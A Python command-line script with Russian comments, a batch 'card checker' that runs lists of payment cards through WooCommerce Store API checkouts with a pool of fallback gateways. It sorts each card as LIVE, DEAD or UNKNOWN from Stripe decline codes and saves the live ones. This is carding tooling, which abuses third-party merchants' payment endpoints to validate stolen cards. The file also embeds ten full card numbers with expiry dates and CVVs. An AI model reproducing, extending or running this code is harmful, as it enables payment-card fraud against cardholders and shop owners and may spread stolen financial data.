"""
Batch checker — проверка карт через WC Store API с gateway pool fallback.

Использует card_checker.py модуль для полной проверки через пул шлюзов.
Поддерживает: файл с картами, stdin, и встроенный список для тестирования.

Использование:
  python batch_check.py                    # встроенный тест-лист
  python batch_check.py --file cards.txt   # из файла
  echo "5154...|07|2026|136" | python batch_check.py  # из stdin
  python batch_check.py --concurrency 5    # параллельность
"""
import asyncio
import json
import sys
import time
import argparse
from pathlib import Path

# Импорт из card_checker (синхронный WC-чек)
from card_checker import (
    check_card,
    format_card_report,
    _mask_pan,
    parse_card,
    CardCheckResult,
)

# Встроенный тест-лист (для быстрого тестирования)
_TEST_CARDS = """
5154620022401325|07|2026|136
5154620022103202|03|2032|392
5154620022420515|07|2027|593
5154620022257586|09|2031|212
5154620022170102|07|2028|302
5154620022518755|04|2029|950
5154620022041378|09|2030|138
5154620022302036|05|2026|619
5154620022582488|08|2027|007
5154620022666810|08|2033|667
""".strip()


def run_batch(
    card_lines: list[str],
    *,
    concurrency: int = 3,
    timeout: float = 30.0,
    json_output: bool = False,
) -> list[CardCheckResult]:
    """Проверяет список карт через WC Store API (синхронно, с паузами).

    Использует card_checker.check_card с --wc режимом, который автоматически
    выбирает gateway из pool, делает fallback, парсит decline.
    """
    results: list[CardCheckResult] = []
    total = len(card_lines)

    print(f"{'═' * 80}")
    print(f"  BATCH CHECK — {total} карт | WC Store API + Gateway Pool")
    print(f"{'═' * 80}")
    print(f"  Логика вердиктов:")
    print(f"    LIVE  = Stripe подтвердил (insufficient_funds / incorrect_cvc / 3DS redirect)")
    print(f"    DEAD  = Stripe отклонил (card_declined / do_not_honor / lost/stolen)")
    print(f"    UNKNOWN = PM создан, но WC не вернул чёткий decline (3DS? generic failure?)")
    print(f"{'═' * 80}\n")

    for i, line in enumerate(card_lines):
        line = line.strip()
        if not line:
            continue

        card = parse_card(line)
        if not card.pan:
            continue

        # Проверяем через WC mode (gateway pool)
        result = check_card(
            line,
            timeout=timeout,
            wc_mode=True,
        )
        results.append(result)

        # Вывод
        pan_masked = _mask_pan(card.pan)
        status = result.live_result.status or "SKIP"
        decline = result.live_result.decline_reason or ""
        icon = {"LIVE": "✓", "DEAD": "✗", "UNKNOWN": "?", "ERROR": "!", "SKIPPED": "○"}.get(status, "?")

        print(f"[{i+1:3d}/{total}] {icon} {pan_masked} | {status:8s} | {decline}")

        # Rate limit между картами
        if i < total - 1:
            time.sleep(1.0)

    # Summary
    print(f"\n{'═' * 80}")
    print(f"  ИТОГО:")
    live = [r for r in results if r.live_result.status == "LIVE"]
    dead = [r for r in results if r.live_result.status == "DEAD"]
    unknown = [r for r in results if r.live_result.status == "UNKNOWN"]
    errors = [r for r in results if r.live_result.status in ("ERROR", "SKIPPED", "")]

    print(f"    ✓ LIVE:    {len(live)}")
    print(f"    ✗ DEAD:    {len(dead)}")
    print(f"    ? UNKNOWN: {len(unknown)}")
    print(f"    ! ERROR:   {len(errors)}")
    print(f"{'═' * 80}")

    # Подробности по LIVE
    if live:
        print(f"\n  ★ ЖИВЫЕ КАРТЫ:")
        for r in live:
            pan = _mask_pan(r.card.pan)
            reason = r.live_result.decline_reason
            print(f"    {pan} | {reason}")

    # Подробности по UNKNOWN (возможно живые)
    if unknown:
        print(f"\n  ? ВЕРОЯТНО ЖИВЫЕ (UNKNOWN):")
        for r in unknown:
            pan = _mask_pan(r.card.pan)
            reason = r.live_result.decline_reason
            print(f"    {pan} | {reason}")

    return results


def main():
    parser = argparse.ArgumentParser(description="Batch card checker via WC Store API")
    parser.add_argument("--file", "-f", type=str, help="Файл с картами (PAN|MM|YYYY|CVV)")
    parser.add_argument("--concurrency", "-c", type=int, default=3, help="Параллельность (не используется в sync)")
    parser.add_argument("--timeout", "-t", type=float, default=30.0, help="Таймаут (сек)")
    parser.add_argument("--json", action="store_true", help="JSON вывод")
    parser.add_argument("--limit", "-l", type=int, default=0, help="Лимит карт (0=все)")
    args = parser.parse_args()

    # Собираем карты
    card_lines: list[str] = []

    if args.file:
        try:
            card_lines = [ln.strip() for ln in Path(args.file).read_text().splitlines() if ln.strip()]
        except FileNotFoundError:
            print(f"Файл не найден: {args.file}", file=sys.stderr)
            sys.exit(1)
    elif not sys.stdin.isatty():
        card_lines = [ln.strip() for ln in sys.stdin if ln.strip()]
    else:
        # Используем встроенный тест-лист
        card_lines = [ln.strip() for ln in _TEST_CARDS.splitlines() if ln.strip()]
        print(f"[*] Используется встроенный тест-лист ({len(card_lines)} карт)\n")

    if args.limit > 0:
        card_lines = card_lines[:args.limit]

    if not card_lines:
        print("Нет карт для проверки.", file=sys.stderr)
        sys.exit(1)

    results = run_batch(
        card_lines,
        concurrency=args.concurrency,
        timeout=args.timeout,
        json_output=args.json,
    )

    if args.json:
        output = [r.to_dict() for r in results]
        print(json.dumps(output, ensure_ascii=False, indent=2))

    # Сохраняем результаты
    output_file = Path("batch_results.txt")
    with open(output_file, "w", encoding="utf-8") as f:
        for r in results:
            pan = _mask_pan(r.card.pan)
            status = r.live_result.status or "SKIP"
            reason = r.live_result.decline_reason or ""
            f.write(f"{pan} | {status} | {reason}\n")
    print(f"\n[*] Результаты сохранены: {output_file}")


if __name__ == "__main__":
    main()
